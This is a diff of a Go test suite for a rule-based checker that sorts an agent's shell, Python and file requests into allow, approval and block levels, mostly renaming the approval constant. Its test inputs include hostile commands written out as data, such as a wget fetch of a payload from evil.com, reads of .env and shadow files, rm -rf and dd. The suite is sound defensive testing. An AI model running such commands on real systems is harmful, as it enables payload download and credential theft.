@@ -46,7 +46,7 @@ func assertDecision(t *testing.T, got Result, wantDecision Decision, wantRisk Ri
 	}
 }
 
-// ─── run_shell: safe_read ─────────────────────────────────────────────────────
+// ─── sandbox.runShell: safe_read ─────────────────────────────────────────────────────
 
 func TestShell_SafeRead_Ls(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("r1", "ls /workspace"))
@@ -83,7 +83,7 @@ func TestShell_SafeRead_HeadFile(t *testing.T) {
 	assertDecision(t, r, DecisionAllow, RiskSafeRead)
 }
 
-// ─── run_shell: safe_write ────────────────────────────────────────────────────
+// ─── sandbox.runShell: safe_write ────────────────────────────────────────────────────
 
 func TestShell_SafeWrite_Mkdir(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("w1", "mkdir /workspace/output"))
@@ -100,39 +100,39 @@ func TestShell_SafeWrite_RunPython(t *testing.T) {
 	assertDecision(t, r, DecisionAllow, RiskSafeWrite)
 }
 
-// ─── run_shell: needs_approval ────────────────────────────────────────────────
+// ─── sandbox.runShell: requires_approval ─────────────────────────────────────────────
 
 func TestShell_NeedsApproval_Rm(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a1", "rm /workspace/output/old.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestShell_NeedsApproval_RmRf(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a2", "rm -rf /workspace/temp"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestShell_NeedsApproval_Mv(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a3", "mv /workspace/a.txt /workspace/b.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestShell_NeedsApproval_Overwrite(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a4", "echo new > /workspace/existing.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestShell_NeedsApproval_Chmod(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a5", "chmod 777 /workspace/script.sh"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestShell_NeedsApproval_Truncate(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("a6", "truncate -s 0 /workspace/log.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
-// ─── run_shell: high_risk (block) ────────────────────────────────────────────
+// ─── sandbox.runShell: high_risk (block) ────────────────────────────────────────────
 
 func TestShell_Block_Shutdown(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("b1", "shutdown -h now"))
@@ -159,24 +159,24 @@ func TestShell_Block_Dd(t *testing.T) {
 	assertDecision(t, r, DecisionBlock, RiskHighRisk)
 }
 
-// ─── run_shell: external_network (block) ─────────────────────────────────────
+// ─── sandbox.runShell: external_network (block) ─────────────────────────────────────
 
 func TestShell_NeedsApproval_Curl(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n1", "curl https://example.com/data.json"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
+	assertDecision(t, r, DecisionRequiresApproval, RiskExternalNetwork)
 }
 
 func TestShell_NeedsApproval_Wget(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n2", "wget http://evil.com/payload"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
+	assertDecision(t, r, DecisionRequiresApproval, RiskExternalNetwork)
 }
 
 func TestShell_NeedsApproval_Ssh(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("n3", "ssh user@remote 'ls'"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskExternalNetwork)
+	assertDecision(t, r, DecisionRequiresApproval, RiskExternalNetwork)
 }
 
-// ─── run_shell: credential_access (block) ────────────────────────────────────
+// ─── sandbox.runShell: credential_access (block) ────────────────────────────────────
 
 func TestShell_Block_DotEnv(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("c1", "cat .env"))
@@ -198,7 +198,7 @@ func TestShell_Block_ShadowFile(t *testing.T) {
 	assertDecision(t, r, DecisionBlock, RiskCredentialAccess)
 }
 
-// ─── run_python: safe_read / allow ───────────────────────────────────────────
+// ─── sandbox.runPython: safe_read / allow ───────────────────────────────────────────
 
 func TestPython_SafeRead_Print(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("p1", `print("hello")`))
@@ -215,7 +215,7 @@ func TestPython_SafeRead_ImportJson(t *testing.T) {
 	assertDecision(t, r, DecisionAllow, RiskSafeRead)
 }
 
-// ─── run_python: safe_write / allow ──────────────────────────────────────────
+// ─── sandbox.runPython: safe_write / allow ──────────────────────────────────────────
 
 func TestPython_SafeWrite_Pandas(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("p4", "import pandas as pd\ndf = pd.read_excel('data.xlsx')"))
@@ -237,29 +237,29 @@ func TestPython_SafeWrite_OpenFile(t *testing.T) {
 	assertDecision(t, r, DecisionAllow, RiskSafeWrite)
 }
 
-// ─── run_python: needs_approval ──────────────────────────────────────────────
+// ─── sandbox.runPython: requires_approval ───────────────────────────────────────────
 
 func TestPython_NeedsApproval_Eval(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pa1", "result = eval(user_input)"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestPython_NeedsApproval_OsRemove(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pa2", "import os\nos.remove('/workspace/old.txt')"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestPython_NeedsApproval_ShutilRmtree(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pa3", "import shutil\nshutil.rmtree('/workspace/temp')"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestPython_NeedsApproval_OsRename(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pa4", "os.rename('old.txt', 'new.txt')"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
-// ─── run_python: high_risk (block) ───────────────────────────────────────────
+// ─── sandbox.runPython: high_risk (block) ───────────────────────────────────────────
 
 func TestPython_Block_Subprocess(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pb1", "import subprocess\nsubprocess.run(['ls'])"))
@@ -276,7 +276,7 @@ func TestPython_Block_CtypesImport(t *testing.T) {
 	assertDecision(t, r, DecisionBlock, RiskHighRisk)
 }
 
-// ─── run_python: external_network (block) ────────────────────────────────────
+// ─── sandbox.runPython: external_network (block) ────────────────────────────────────
 
 func TestPython_Block_Socket(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pn1", "import socket\ns = socket.create_connection(('8.8.8.8', 53))"))
@@ -293,7 +293,7 @@ func TestPython_Block_Urllib(t *testing.T) {
 	assertDecision(t, r, DecisionBlock, RiskExternalNetwork)
 }
 
-// ─── run_python: credential_access (block) ───────────────────────────────────
+// ─── sandbox.runPython: credential_access (block) ───────────────────────────────────
 
 func TestPython_Block_DotEnv(t *testing.T) {
 	r := DefaultChecker.Check(pythonReq("pc1", "with open('.env') as f: print(f.read())"))
@@ -334,12 +334,12 @@ func TestFileOps_Copy(t *testing.T) {
 
 func TestFileOps_Delete(t *testing.T) {
 	r := DefaultChecker.Check(fileOpsReq("f5", "delete", "temp.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestFileOps_Move(t *testing.T) {
 	r := DefaultChecker.Check(fileOpsReq("f6", "move", "old.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestFileOps_UnknownOp(t *testing.T) {
@@ -379,10 +379,10 @@ func TestResult_RequestIDPropagated(t *testing.T) {
 func TestSafeWriteRequiresConfirm(t *testing.T) {
 	strictChecker := NewRuleBasedChecker(RuleBasedConfig{SafeWriteRequiresConfirm: true})
 
-	// mkdir is safe_write → should become needs_approval under strict config.
+	// mkdir is safe_write → should become requires_approval under strict config.
 	r := strictChecker.Check(shellReq("sc1", "mkdir /workspace/output"))
-	if r.Decision != DecisionNeedsApproval {
-		t.Errorf("strict mode: safe_write should become needs_approval, got %q", r.Decision)
+	if r.Decision != DecisionRequiresApproval {
+		t.Errorf("strict mode: safe_write should become requires_approval, got %q", r.Decision)
 	}
 	if r.RiskLevel != RiskSafeWrite {
 		t.Errorf("strict mode: risk_level should still be safe_write, got %q", r.RiskLevel)
@@ -401,7 +401,7 @@ func TestSafeWriteRequiresConfirm_DoesNotAffectBlock(t *testing.T) {
 
 func TestShell_CaseInsensitive_RM(t *testing.T) {
 	r := DefaultChecker.Check(shellReq("ci1", "RM /workspace/file.txt"))
-	assertDecision(t, r, DecisionNeedsApproval, RiskNeedsApproval)
+	assertDecision(t, r, DecisionRequiresApproval, RiskNeedsApproval)
 }
 
 func TestPython_CaseInsensitive_Subprocess(t *testing.T) {
